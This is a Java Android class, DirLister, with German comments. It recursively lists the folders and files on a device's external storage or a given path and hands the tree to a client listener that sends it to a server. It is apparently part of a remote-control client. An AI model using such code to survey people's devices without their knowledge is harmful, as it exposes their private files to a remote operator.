package my.app.Library;

import java.io.File;
import java.util.ArrayList;

import my.app.client.ClientListener;

import utils.MyFile;
import Packet.FileTreePacket;
import android.content.Context;
import android.os.Environment;
/**
 * Diese Klasse wird zum Abfragen der Ordnerstruktur des Clients verwendent.
 */
public class DirLister {
	/**
	 * Methode zum Erstellen eines FileTreePacket.
	 * @param c	Service der die Methode aufruft
	 * @param channel Kanal zur Daten�bertragung
	 * @param dirname Verzeichnis ab welchem die Auflistung beginnen soll.
	 * @return false falls der Ordner nicht existiert, true sonst.
	 */
	public static boolean listDir(ClientListener c, int channel, String dirname) {
		/**
		 * f Von hier aus wir diesem Verzeichnis aus wird die Ordnerstruktur erstellt.
		 */
		File f;
		/**
		 * ar	In dieser Liste werden die Daten �ber die Ordner gepseichert.
		 */
		ArrayList<MyFile> ar = new ArrayList<MyFile>();
		/**
		 * �berpr�fen ob das Startverzeichnis \ ist. Wenn dies nicht der Fall ist wird der erste externe Speicher als Verzeichniss verwendet.
		 */
		if(dirname.equals("/"))
			f = Environment.getExternalStorageDirectory();
		else
		/**
		 * Ansonsten einen neuen Ordner mit dem �bergebenen Verzeichnis erstellen.
		 */
			f = new File(dirname);
		/**
		 * Sollte f nicht existieren, wird die Methode beendet.
		 */
		if (!f.exists()) {
			return false;
		} 
		else {
			/**
			 * Ansonsten wird die vistiAllDirsAndFiles Methode mit f als Argument aufgerufen und das Ergebnis in der ArrayList ar gespeichert.
			 */
			ar.add(visitAllDirsAndFiles(f));
			/**
			 * Neues FileTreePacket erstellen und die ArrayList �bergeben.
			 * Das Paket wird danach an den Server gesendet.
			 * Zus�tzlich wird true zur�ckgegeben.
			 */
			c.handleData(channel, new FileTreePacket(ar).build());
			return true;
		}
	}

	/**
	 * Diese Methode geht von Startverzeichnis aus alles Kindordner durch.
	 * @param dir 	Der Start Konten
	 * @param ar	Die ArrayListe in der die Daten gespeichert werden.
	 */
	public static void visitAllDirsAndFiles(File dir, ArrayList<MyFile> ar) {
		/**
		 * �berpr�fen ob der Ordner existiert.
		 */
		if(dir.exists()) {
			/**
			 * �berpr�fen ob es sich um eine Verzeichnis handelt.
			 */
		    if (dir.isDirectory()) {
				/**
				 * M�gliche Kinderordner des Verzeichnis im StringArray auflisten.
				 */
		        String[] children = dir.list();
				/**
				 * Den Ordner der ArrayList hinzuf�gen.
				 */
				ar.add(new MyFile(dir));
				/**
				 * �berpr�fen ob die Kindordner wiederum Kindordner besitzen.
				 */
		        if(children != null) {
					/**
					 * For Schleife durch alle Unterordner
					 */
			        for (String child: children) {
			        	//System.out.println(dir.toString()+"/"+child);
			        	try {
							/**
							 * Erstellen eines neuen Files wobei der dir Ordnerpfad und child der Ordnername ist.
							 */
			        		File f = new File(dir, child);
							/**
							 * Rekursiver Aufruf der Methode vistiAllDirsAndFiles
							 */
			        		visitAllDirsAndFiles(f, ar);
			        	}
			        	catch(Exception e) {
			        		System.out.println("Child !"+child);
			        		e.printStackTrace();
			        	}
			        }
		        }
		    }
		    else
			/**
			 * Wenn dir kein Verzeichnis ist, nur die Datei dir der Liste ar hinzuf�gen.
			 */
		    	ar.add(new MyFile(dir));
		}
	}

	/**
	 * Diese Methode listet alle Ordner und Unterordner ab dem Order dir auf.
	 * @param dir	Wurzelordner
	 * @return der Ordner
	 */
	public static MyFile visitAllDirsAndFiles(File dir) {
		/**
		 * �berpr�fen ob der Ordner dir existiert.
		 */
		if(dir.exists()) {
			/**
			 * �berpr�fen ob dir ein Verzeichnis ist.
			 */
		    if (dir.isDirectory()) {
				/**
				 * Unterorder/Dateien von Dir auflisten und in children speichern.
				 */
		        String[] children = dir.list();
				/**
				 * Neuen Ordener f�r dir erstellen
				 */
		        MyFile myf = new MyFile(dir);
		        //ar.add(new MyFile(dir));
				/**
				 * �berpr�fen ob es Kinder gibt.
				 */
		        if(children != null) {
					/**
					 * �berpr�fen ob das Array eine L�nge !=0 hat
					 */
		        	if(children.length != 0) {
						/**
						 * For-Schleife durch alle Elemente des Arrays children
						 */
				        for (String child: children) {
				        	//System.out.println(dir.toString()+"/"+child);
				        	try {
								/**
								 * Versuchen einen neuen Ordner mit dem Pfad dir und dem Namen Child zu erstellt.
								 */
				        		File f = new File(dir, child);
								/**
								 * Rekursiver Aufruf der Methode.
								 */
				        		myf.addChild(visitAllDirsAndFiles(f));
				        	}
				        	catch(Exception e) {
				        		System.out.println("Child !"+child);
				        		e.printStackTrace();
				        	}
				        }
		        	}
		        }
				/**
				 * myf zur�ckgeben
				 */
	        	return myf;
		    }
		    else
			/**
			 * Keine Unterordner daher wird nur der File dir zur�ckgegeben
			 */
		    	return new MyFile(dir);
		}
		/**
		 * Ordner existiert nicht daher wird null zur�ckgeliefert.
		 */
		return null;
	}
	
}
